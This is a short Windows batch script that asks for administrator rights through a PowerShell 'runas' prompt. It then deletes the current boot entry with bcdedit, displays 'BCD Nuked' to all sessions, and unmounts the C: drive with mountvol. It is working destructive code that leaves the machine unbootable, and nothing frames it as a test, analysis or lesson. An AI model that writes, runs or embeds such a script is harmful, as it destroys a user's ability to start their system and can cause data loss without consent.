@echo off
if "%1" == "elevated" goto start
powershell -command "Start-Process %~nx0 elevated -Verb runas"
goto :EOF
:start
bcdedit /delete {current}
msg * BCD Nuked
mountvol C:\ /d
